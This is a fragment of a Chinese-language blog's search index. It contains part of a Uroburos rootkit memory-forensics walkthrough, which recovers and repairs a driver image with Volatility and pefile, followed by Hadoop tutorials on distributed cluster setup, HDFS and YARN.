Rootkit分析","uri":"/2019/10/rootkit/"},{"categories":["LINUX"],"content":"导出驱动 ","date":"2019-10-24","objectID":"/2019/10/rootkit/:2:0","tags":["rootkit"],"title":"Uroburos Rootkit分析","uri":"/2019/10/rootkit/"},{"categories":["LINUX"],"content":"追踪内存中的驱动 我们直接使用volatility的modlist插件，并没有发现任何有价值的消息。之前为rootkit驱动程序确定的内存空间中似乎没有模块。我们注意到驱动程序似乎占用了很大的内存空间，我们可以从目前为止确定的最低地址开始向后搜索内存。寻找PE头，以0x8963a020为起点，向后看0x6000字节。 \u003e\u003e\u003e db(0x8963a020-0x6000, 0x6000) 0x89634020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x89634030 00 00 00 00 00 00 00 00 00 00 00 00 d0 00 00 00 ................ 0x89634040 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 ........!..L.!Th 0x89634050 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f is.program.canno 0x89634060 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 t.be.run.in.DOS. 0x89634070 6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00 mode....$....... 0x89634080 b2 4e 55 e7 f6 2f 3b b4 f6 2f 3b b4 f6 2f 3b b4 .NU../;../;../;. 0x89634090 f6 2f 3a b4 26 2f 3b b4 af 0c 28 b4 ff 2f 3b b4 ./:.\u0026/;...(../;. 0x896340a0 d1 e9 46 b4 f4 2f 3b b4 d1 e9 4a b4 74 2f 3b b4 ..F../;...J.t/;. 0x896340b0 d1 e9 41 b4 f7 2f 3b b4 d1 e9 43 b4 f7 2f 3b b4 ..A../;...C../;. 0x896340c0 52 69 63 68 f6 2f 3b b4 00 00 00 00 00 00 00 00 Rich./;......... 0x896340d0 00 00 00 00 4c 01 05 00 e7 eb 14 51 00 00 00 00 ....L......Q.... 0x896340e0 00 00 00 00 e0 00 02 21 0b 01 08 00 00 00 07 00 .......!........ 0x896340f0 00 72 02 00 00 00 00 00 40 d1 00 00 00 10 00 00 .r......@....... [snip] 在上面的结果中，我们看到了DOS头，然后往前看一点，去寻找“MZ”： \u003e\u003e\u003e db(0x89634000, 0x100) 0x89634000 00 00 00 00 03 00 00 00 04 00 00 00 ff ff 00 00 ................ 0x89634010 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 ........@....... 0x89634020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x89634030 00 00 00 00 00 00 00 00 00 00 00 00 d0 00 00 00 ................ 0x89634040 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 ........!..L.!Th 0x89634050 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f is.program.canno 0x89634060 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 t.be.run.in.DOS. 0x89634070 6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00 mode....$....... 0x89634080 b2 4e 55 e7 f6 2f 3b b4 f6 2f 3b b4 f6 2f 3b b4 .NU../;../;../;. 0x89634090 f6 2f 3a b4 26 2f 3b b4 af 0c 28 b4 ff 2f 3b b4 ./:.\u0026/;...(../;. 0x896340a0 d1 e9 46 b4 f4 2f 3b b4 d1 e9 4a b4 74 2f 3b b4 ..F../;...J.t/;. 0x896340b0 d1 e9 41 b4 f7 2f 3b b4 d1 e9 43 b4 f7 2f 3b b4 ..A../;...C../;. 0x896340c0 52 69 63 68 f6 2f 3b b4 00 00 00 00 00 00 00 00 Rich./;......... 0x896340d0 00 00 00 00 4c 01 05 00 e7 eb 14 51 00 00 00 00 ....L......Q.... 0x896340e0 00 00 00 00 e0 00 02 21 0b 01 08 00 00 00 07 00 .......!........ 0x896340f0 00 72 02 00 00 00 00 00 40 d1 00 00 00 10 00 00 .r......@....... 奇怪的是“MZ”和“PE”的魔术字都没有找到，这意味moddump插件可能存在问题，需要进行修改。 ","date":"2019-10-24","objectID":"/2019/10/rootkit/:2:1","tags":["rootkit"],"title":"Uroburos Rootkit分析","uri":"/2019/10/rootkit/"},{"categories":["LINUX"],"content":"修补内存 volatility有个patcher插件可以处理这种情况。我们首先要写一个xml文件来修补PE头： 这将在每个页面边界的起始位置搜索我们在内存中找到的驱动程序的开始字节，并为结构正确的PE头插入魔术字。 $ python2 /opt/volatility-2.3.1/vol.py -f uroburos_mod.vmem --profile=WinXPSP3x86 patcher -w -x patchdriver.xml Volatility Foundation Volatility Framework 2.3.1 Write support requested. Please type \"Yes, I want to enable write support\" below precisely (case-sensitive): Yes, I want to enable write support Calibrating for speed: Reading patch locations per page Patching Fix Driver MZ Header at page 9634000 看起来没有问题，我们检查一下： \u003e\u003e\u003e db(0x89634000, 0x100) 0x89634000 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 MZ.............. 0x89634010 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 ........@....... 0x89634020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x89634030 00 00 00 00 00 00 00 00 00 00 00 00 d0 00 00 00 ................ 0x89634040 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 ........!..L.!Th 0x89634050 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f is.program.canno 0x89634060 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 t.be.run.in.DOS. 0x89634070 6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00 mode....$....... 0x89634080 b2 4e 55 e7 f6 2f 3b b4 f6 2f 3b b4 f6 2f 3b b4 .NU../;../;../;. 0x89634090 f6 2f 3a b4 26 2f 3b b4 af 0c 28 b4 ff 2f 3b b4 ./:.\u0026/;...(../;. 0x896340a0 d1 e9 46 b4 f4 2f 3b b4 d1 e9 4a b4 74 2f 3b b4 ..F../;...J.t/;. 0x896340b0 d1 e9 41 b4 f7 2f 3b b4 d1 e9 43 b4 f7 2f 3b b4 ..A../;...C../;. 0x896340c0 52 69 63 68 f6 2f 3b b4 00 00 00 00 00 00 00 00 Rich./;......... 0x896340d0 50 45 00 00 4c 01 05 00 e7 eb 14 51 00 00 00 00 PE..L......Q.... 0x896340e0 00 00 00 00 e0 00 02 21 0b 01 08 00 00 00 07 00 .......!........ 0x896340f0 00 72 02 00 00 00 00 00 40 d1 00 00 00 10 00 00 .r......@....... OK,这次就没有问题了。 ","date":"2019-10-24","objectID":"/2019/10/rootkit/:2:2","tags":["rootkit"],"title":"Uroburos Rootkit分析","uri":"/2019/10/rootkit/"},{"categories":["LINUX"],"content":"转储驱动程序 现在PE结构已经修复了，我们可以从内存中将驱动程序转储出来： $ python2 /opt/volatility-2.3.1/vol.py -f uroburos_mod.vmem --profile=WinXPSP3x86 moddump -b 0x89634000 -D . Volatility Foundation Volatility Framework 2.3.1 Module Base Module Name Result ----------- -------------------- ------ 0x089634000 UNKNOWN OK: driver.89634000.sys 这里需要注意的是，我们使用moddump插件进行内存转储时，并没有修复ImageBase，所以需要我们进行手动修复。这里可以使用pefile库： \u003e\u003e\u003e import pefile \u003e\u003e\u003e pe = pefile.PE('driver.89634000.sys') \u003e\u003e\u003e hex(pe.OPTIONAL_HEADER.ImageBase) '0x10000' \u003e\u003e\u003e pe.OPTIONAL_HEADER.ImageBase = 0x89634000 \u003e\u003e\u003e pe.write(filename='driver.89634000_mod.sys') OK，到此为止，转储出来的驱动程序应该就没有问题了，使用IDA打开看一下： 没有问题，现在就可以使用IDA进行深入的静态分析了。 ","date":"2019-10-24","objectID":"/2019/10/rootkit/:2:3","tags":["rootkit"],"title":"Uroburos Rootkit分析","uri":"/2019/10/rootkit/"},{"categories":["Vuln"],"content":"Hadoop--初学到漏洞","date":"2019-10-19","objectID":"/2019/10/hadoop6/","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"Hadoop–初学到漏洞(六)–分布式环境搭建 ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:0:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"服务器功能规划 zy1 zy2 zy3 NameNode ResourceManage DataNode DataNode DataNode NodeManager NodeManager NodeManager HistoryServer SecondaryNameNode ip：10.251.0.144 ip：10.251.0.150 ip：10.251.0.151 ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:1:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"一、解压Hadoop目录 wget http://mirrors.tuna.tsinghua.edu.cn/apache/hadoop/common/hadoop-2.8.5/hadoop-2.8.5.tar.gz tar -zxvf hadoop-2.8.5.tar.gz -C /opt/bigdata mv hadoop-2.8.5 hadoop 在伪分布式安装时，已经配置了hadoop的环境变量，无需再重复配置了。验证： echo $HADOOP_HOME ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:2:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"二、配置 hadoop-env.sh、mapred-env.sh yarn-env.sh JAVA_HOME参数 比如修改hadoop-env.sh： vim ${HADOOP_HOME}/etc/hadoop/hadoop-env.sh 修改JAVA_HOME参数为： export JAVA_HOME=/usr/lib/jvm/java ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:3:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"三、各主要配置文件配置 ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:4:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"1. 配置core-site.xml vim ${HADOOP_HOME}/etc/hadoop/core-site.xml 添加内容如下： \u003cconfiguration\u003e \u003cproperty\u003e \u003cname\u003efs.defaultFS\u003c/name\u003e \u003cvalue\u003ehdfs://zy1:9000\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003ehadoop.tmp.dir\u003c/name\u003e \u003cvalue\u003e/opt/bigdata/data/hadoop\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003edfs.namenode.name.dir\u003c/name\u003e \u003cvalue\u003efile://${hadoop.tmp.dir}/dfs/name\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003edfs.datanode.data.dir\u003c/name\u003e \u003cvalue\u003efile://${hadoop.tmp.dir}/dfs/data\u003c/value\u003e \u003c/property\u003e \u003c/configuration\u003e fs.defaultFS为NameNode的地址。 hadoop.tmp.dir：为hadoop临时目录的地址，默认情况下，NameNode和DataNode的数据文件都会存在这个目录下的对应子目录下（但是上面我们通过dfs.datanode.data.dir，和dfs.namenode.data.dir指定了）。应该保证此目录是存在的，如果不存在，先创建； dfs.namenode.name.dir：指定目录来供namenode存储永久性的文件系统元数据（如果指定多个路径，使用\",“隔开）。这些元数据文件会同时备份在所有指定的目录上，通常情况下，通过配置dfs.namenode.data.dir可以将namenode元数据写到一两个本地磁盘和一个远程磁盘（例如NFS挂载目录）之中。这样的话，即使本地磁盘发生故障，甚至整个namenode发生故障，都可以恢复数据文件并重新构成新的namenode（辅助namenode只是定期保存namenode的检查点，不维护namenode的最新备份）； dfs.datanode.data.dir：可以设定datanode存储数据块的目录列表，上面提到dfs.namenode.name.dir描述一系列目录，其目的是为了支持namenode进行冗余备份。虽然dfs.datanode.data.dir也描述了一系列目录，但是其目的是使datanode循环的在各个目录中写数据。因此，为了提高性能，最好分别为各个本地磁盘指定一个存储目录，这样一来，数据块跨磁盘分布，针对不同的数据块的读操作可以并发执行，从而提高读取速度。 mkdir /opt/bigdata/data/hadoop ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:4:1","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"2. 配置hdfs-site.xml vim ${HADOOP_HOME}/etc/hadoop/hdfs-site.xml 添加以下内容： \u003cconfiguration\u003e \u003cproperty\u003e \u003cname\u003edfs.namenode.secondary.http-address\u003c/name\u003e \u003cvalue\u003ezy3:50090\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003edfs.replication\u003c/name\u003e \u003cvalue\u003e2\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003edfs.client.use.datanode.hostname\u003c/name\u003e \u003cvalue\u003etrue\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003edfs.datanode.use.datanode.hostname\u003c/name\u003e \u003cvalue\u003etrue\u003c/value\u003e \u003c/property\u003e \u003c/configuration\u003e dfs.namenode.secondary.http-address：是指定secondaryNameNode的http访问地址和端口号，因为在规划中，我们将zy3规划为SecondaryNameNode服务器。所以这里设置为：zy3:50090。 dfs.replication配置的是HDFS存储时的备份数量，这里设置为2； fs.client.use.datanode.hostname：是否客户端应该使用DN的HostName，在连接DN时，默认是使用IP；（必须设置为true） dfs.datanode.use.datanode.hostname：是否DN应该使用HostName连接其它DN，在数据传输时。默认是是IP。（必须设置为true） ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:4:2","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"3. 配置masters、slaves cd hadoop vim etc/hadoop/masters vim etc/hadoop/slaves masters修改为：zy1 slavers：zy2 ​ zy3 masters文件是指定HDFS的主节点，zy1特有；slaves文件是指定HDFS上有哪些DataNode节点。 ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:4:3","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"4. 配置mapred-site.xml 复制mapred-site.xml.template配置模板文件生成mapred-site.xml： cp etc/hadoop/mapred-site.xml.template etc/hadoop/mapred-site.xml 添加配置： vim etc/hadoop/mapred-site.xml 修改内容如下： \u003cconfiguration\u003e \u003cproperty\u003e \u003cname\u003emapreduce.framework.name\u003c/name\u003e \u003cvalue\u003eyarn\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003emapreduce.jobhistory.address\u003c/name\u003e \u003cvalue\u003ezy1:10020\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003emapreduce.jobhistory.webapp.address\u003c/name\u003e \u003cvalue\u003ezy1:19888\u003c/value\u003e \u003c/property\u003e \u003c/configuration\u003e mapreduce.framework.name设置mapreduce任务运行在yarn上； mapreduce.jobhistory.address是设置mapreduce的历史服务器安装在zy1机器上； mapreduce.jobhistory.webapp.address是设置历史服务器的web页面地址和端口号。 ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:4:4","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"5. 配置yarn-site.xml vim etc/hadoop/yarn-site.xml 添加内容如下： \u003cconfiguration\u003e \u003cproperty\u003e \u003cname\u003eyarn.nodemanager.aux-services\u003c/name\u003e \u003cvalue\u003emapreduce_shuffle\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003eyarn.resourcemanager.hostname\u003c/name\u003e \u003cvalue\u003ezy2\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003eyarn.log-aggregation-enable\u003c/name\u003e \u003cvalue\u003etrue\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003eyarn.log-aggregation.retain-seconds\u003c/name\u003e \u003cvalue\u003e106800\u003c/value\u003e \u003c/property\u003e \u003c/configuration\u003e yarn.nodemanager.aux-services配置了yarn的默认混洗方式，选择为mapreduce的默认混洗算法； yarn.resourcemanager.hostname指定了Resourcemanager运行在zy2节点上； yarn.log-aggregation-enable是配置是否启用日志聚集功能； yarn.log-aggregation.retain-seconds是配置聚集的日志在HDFS上最多保存多长时间； ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:4:5","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"四、设置SSH无密码登录及文件分发 ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:5:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"1. SSH无密码登录配置 Hadoop集群中的各个机器间会相互地通过SSH访问，所以要配置各个机器间的SSH为无密码登录的。 在zy1上生成公钥： ssh-keygen -t rsa 在当前用户的Home目录下的.ssh目录中会生成公钥文件（id_rsa.pub）和私钥文件（id_rsa）。 分发公钥： ssh-copy-id zy1 ssh-copy-id zy2 ssh-copy-id zy3 设置zy2、zy3到其他机器的无密钥登录：同样的在zy2、zy3上生成公钥和私钥后，将公钥分发到三台机器上。 ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:5:1","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"2. 分发Hadoop文件 通过Scp分发： cd /opt/bigdata scp -r /opt/bigdata/hadoop/ zy2:/opt/bigdata scp -r /opt/bigdata/hadoop/ zy3:/opt/bigdata 在每个节点下执行： mkdir /opt/bigdata/data/hadoop ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:5:2","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"五、格式化和启动运行 ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:6:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"1. 格式NameNode 在使用hadoop之前，全新的HDFS安装需要进行格式化。通过创建存储目录和初始化版本的namenode持久数据结构，格式化将创建一个空的文件系统。 在NameNode机器上(节点zy1)执行格式化： hdfs namenode -format 注意：如果需要重新格式化NameNode，需要先将原来NameNode和DataNode下的文件全部删除，不然会报错，NameNode和DataNode所在目录是在core-site.xml中hadoop.tmp.dir、dfs.namenode.name.dir、dfs.datanode.data.dir属性配置的。 每次格式化，默认创建一个集群ID，并写入NameNode的VERSION文件中（VERSION文件所在目录为dfs/name/current ）。 此时并没有将集群ID写入DataNode的VERSION之中，由于namenode管理所有的文件系统的元数据，datanode可以动态加入或离开集群，所以初始的格式化过程不涉及datanode。 只有在启动HDFS时，才会将ID写入DataNode的VERSION之中。如果我们重新格式化HDFS，重新格式化时，默认会生成一个新的集群ID，如果不删除原来的数据目录，会导致namenode中的VERSION文件中是新的集群ID,而DataNode中是旧的集群ID，不一致时会报错。 ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:6:1","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"2. 启动HDFS 在zy1节点运行以下命令： start-dfs.sh ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:6:2","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"3. 启动YARN start-yarn.sh 在zy2上启动ResourceManager： yarn-daemon.sh start resourcemanager ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:6:3","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"4. 启动日志服务器 规划为在zy1服务器上运行MapReduce日志服务，所以要在zy1上启动： mr-jobhistory-daemon.sh start historyserver ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:6:4","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"5. 查看HDFS Web页面 hdfs的Web客户端端口号是50070，通过http://zy1:50070/可以查看。 ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:6:5","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"6. 查看YARN Web 页面 YARN的Web客户端端口号是8088，由于ResourceManager设置在zy2节点上，因此通过http://zy2:8088/查看当前执行的job。 ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:6:6","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"7. hadoop配置信息 Hadoop更多端口相关的配置参考：hadoop端口号配置信息、ResourceManager相关配置参数。 更多Hadoop的参数配置可以惨开：hadoop 参数配置。 ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:6:7","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"8. 关闭hadoop 在各个节点下运行如下命令： cd /opt/bigdata/hadoop sbin/stop-all.sh ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:6:8","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"9. 重新格式化和启动 在每个节点运行如下命令： cd /opt/bigdata/hadoop sbin/stop-all.sh rm -rf logs/* rm -rf ../data/hadoop/* 在namenode节点(zy1)运行： hdfs namenode -format 然后在每个节点运行相应启动hadoop的命令。 ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:6:9","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"六、错误排查 如果hadoop启动出现出错，查看日志，日志位于hadoop安装路径下的logs目录下。 ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:7:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"七、参考文章 https://blog.csdn.net/hliq5399/article/details/78193113 https://www.cnblogs.com/zyly/p/11209286.html#_label4_16 https://blog.csdn.net/bqw18744018044/article/details/79103931 https://blog.csdn.net/henrrywan/article/details/86432912?depth_1-utm_source=distribute.pc_relevant.none-task\u0026utm_source=distribute.pc_relevant.none-task https://hadoop.apache.org/docs/ ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:8:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"Hadoop--初学到漏洞","date":"2019-10-18","objectID":"/2019/10/hadoop5/","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(五)--HDFS","uri":"/2019/10/hadoop5/"},{"categories":["Vuln"],"content":"Hadoop–初学到漏洞(五)–HDFS ","date":"2019-10-18","objectID":"/2019/10/hadoop5/:0:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(五)--HDFS","uri":"/2019/10/hadoop5/"},{"categories":["Vuln"],"content":"一、架构 HDFS遵循主从架构。 Block数据块; 基本存储单位，一般大小为64M（配置大的块主要是因为：1）减少搜寻时间，一般硬盘传输速率比寻道时间要快，大的块可以减少寻道时间；2）减少管理块的数据开销，每个块都需要在NameNode上有对应的记录；3）对数据块进行读写，减少建立网络的连接成本） 一个大文件会被拆分成一个个的块，然后存储于不同的机器。如果一个文件少于Block大小，那么实际占用的空间为其文件的大小 基本的读写单位，类似于磁盘的页，每次都是读写一个块 每个块都会被复制到多台机器，默认复制3份 NameNode 存储文件的metadata，运行时所有数据都保存到内存，整个HDFS可存储的文件数受限于NameNode的内存大小 一个Block在NameNode中对应一条记录（一般一个block占用150字节），如果是大量的小文件，会消耗大量内存。同时map task的数量是由splits来决定的，所以用MapReduce处理大量的小文件时，就会产生过多的map task，线程管理开销将会增加作业时间。处理大量小文件的速度远远小于处理同等大小的大文件的速度。因此Hadoop建议存储大文件 数据会定时保存到本地磁盘，但不保存block的位置信息，而是由DataNode注册时上报和运行时维护（NameNode中与DataNode相关的信息并不保存到NameNode的文件系统中，而是NameNode每次重启后，动态重建） NameNode失效则整个HDFS都失效了，所以要保证NameNode的可用性 Secondary NameNode 定时与NameNode进行同步（定期合并文件系统镜像和编辑日志，然后把合并后的传给NameNode，替换其镜像，并清空编辑日志，类似于CheckPoint机制），但NameNode失效后仍需要手工将其设置成主机 DataNode 保存具体的block数据 负责数据的读写操作和复制操作 DataNode启动时会向NameNode报告当前存储的数据块信息，后续也会定时报告修改信息 DataNode之间会进行通信，复制数据块，保证数据的冗余性 ","date":"2019-10-18","objectID":"/2019/10/hadoop5/:1:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(五)--HDFS","uri":"/2019/10/hadoop5/"},{"categories":["Vuln"],"content":"二、写文件 1.客户端将文件写入本地磁盘的HDFS Client文件中 2.当临时文件大小达到一个block大小时，HDFS client通知NameNode，申请写入文件 3.NameNode在HDFS的文件系统中创建一个文件，并把该block id和要写入的DataNode的列表返回给客户端 4.客户端收到这些信息后，将临时文件写入DataNodes 4.1 客户端将文件内容写入第一个DataNode（一般以4kb为单位进行传输） 4.2 第一个DataNode接收后，将数据写入本地磁盘，同时也传输给第二个DataNode 4.3 依此类推到最后一个DataNode，数据在DataNode之间是通过pipeline的方式进行复制的 4.4 后面的DataNode接收完数据后，都会发送一个确认给前一个DataNode，最终第一个DataNode返回确认给客户端 4.5 当客户端接收到整个block的确认后，会向NameNode发送一个最终的确认信息 4.6 如果写入某个DataNode失败，数据会继续写入其他的DataNode。然后NameNode会找另外一个好的DataNode继续复制，以保证冗余性 4.7 每个block都会有一个校验码，并存放到独立的文件中，以便读的时候来验证其完整性 5.文件写完后（客户端关闭），NameNode提交文件（这时文件才可见，如果提交前，NameNode垮掉，那文件也就丢失了。fsync：只保证数据的信息写到NameNode上，但并不保证数据已经被写到DataNode中） Rack aware（机架感知） 通过配置文件指定机架名和DNS的对应关系 假设复制参数是3，在写入文件时，会在本地的机架保存一份数据，然后在另外一个机架内保存两份数据（同机架内的传输速度快，从而提高性能） 整个HDFS的集群，最好是负载平衡的，这样才能尽量利用集群的优势。 ","date":"2019-10-18","objectID":"/2019/10/hadoop5/:2:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(五)--HDFS","uri":"/2019/10/hadoop5/"},{"categories":["Vuln"],"content":"三、读文件 客户端向NameNode发送读取请求 NameNode返回文件的所有block和这些block所在的DataNodes（包括复制节点） 客户端直接从DataNode中读取数据，如果该DataNode读取失败（DataNode失效或校验码不对），则从复制节点中读取（如果读取的数据就在本机，则直接读取，否则通过网络读取） ","date":"2019-10-18","objectID":"/2019/10/hadoop5/:3:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(五)--HDFS","uri":"/2019/10/hadoop5/"},{"categories":["Vuln"],"content":"四、可靠性 DataNode可以失效 DataNode会定时发送心跳到NameNode。如果一段时间内NameNode没有收到DataNode的心跳消息，则认为其失效。此时NameNode就会将该节点的数据（从该节点的复制节点中获取）复制到另外的DataNode中 数据可以毁坏 无论是写入时还是硬盘本身的问题，只要数据有问题（读取时通过校验码来检测），都可以通过其他的复制节点读取，同时还会再复制一份到健康的节点中 NameNode不可靠 ","date":"2019-10-18","objectID":"/2019/10/hadoop5/:4:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(五)--HDFS","uri":"/2019/10/hadoop5/"},{"categories":["Vuln"],"content":"五、命令工具 fsck: 检查文件的完整性 start-balancer.sh: 重新平衡HDFS hdfs dfs -copyFromLocal 从本地磁盘复制文件到HDFS ","date":"2019-10-18","objectID":"/2019/10/hadoop5/:5:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(五)--HDFS","uri":"/2019/10/hadoop5/"},{"categories":["Vuln"],"content":"Hadoop--初学到漏洞","date":"2019-10-17","objectID":"/2019/10/hadoop4/","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(四)--YARN","uri":"/2019/10/hadoop4/"},{"categories":["Vuln"],"content":"Hadoop–初学到漏洞(四)–YARN ","date":"2019-10-17","objectID":"/2019/10/hadoop4/:0:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(四)--YARN","uri":"/2019/10/hadoop4/"},{"categories":["Vuln"],"content":"一、架构 YARN的架构如下图所示： YARN将资源管理和任务调度监控拆分成了独立的进程：一个全局的资源管理和一个每个作业的管理（ApplicationMaster）。 ResourceManager和NodeManager提供了计算资源的分配和管理，而ApplicationMaster则完成应用程序的运行。 ","date":"2019-10-17","objectID":"/2019/10/hadoop4/:1:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(四)--YARN","uri":"/2019/10/hadoop4/"},{"categories":["Vuln"],"content":"1. ResourceManager 负责全局的资源管理和任务调度，把整个集群当成计算资源池，只关注分配，不管应用，且不负责容错。 资源管理 以前资源是每个节点分成一个个的Map slot和Reduce slot，现在是一个个Container，每个Container可以根据需要运行ApplicationMaster、Map、Reduce或者任意的程序 以前的资源分配是静态的，目前是动态的，资源利用率更高 Container是资源申请的单位，一个资源申请格式：\u003cresource-name, priority, resource-requirement, number-of-containers\u003e, resource-name：主机名、机架名或*（代表任意机器）, resource-requirement：目前只支持CPU和内存 用户提交作业到ResourceManager，然后在某个NodeManager上分配一个Container来运行ApplicationMaster，ApplicationMaster再根据自身程序需要向ResourceManager申请资源 